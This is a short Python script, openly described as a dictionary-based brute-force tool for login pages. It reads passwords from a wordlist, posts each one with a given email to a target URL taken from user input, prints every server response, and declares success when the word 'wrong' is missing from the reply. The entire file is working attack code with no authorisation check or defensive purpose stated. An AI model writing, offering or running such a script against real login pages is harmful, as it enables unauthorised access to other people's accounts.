"""This performs dictionary-based brute-force attacks on login pages"""
import requests

# Function to attempt login
def brute_force(url, username, wordlist):
    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            data = {"email": username, "password": password}  # Adjust if needed
            response = requests.post(url, json=data)
            
            # Prints the response to check what happens
            print(f"Trying: {password} → Response: {response.text}") 

            if "wrong" not in response.text:  # Adjusts condition based on actual response
                print(f"[+] Password Found: {password}")
                return

    print("[-] No valid password found.")

# User inputs
target_url = input("Enter the target URL: ")
username = input("Enter Username: ")
wordlist_path = input("Enter the wordlist file path: ")

brute_force(target_url, username, wordlist_path)


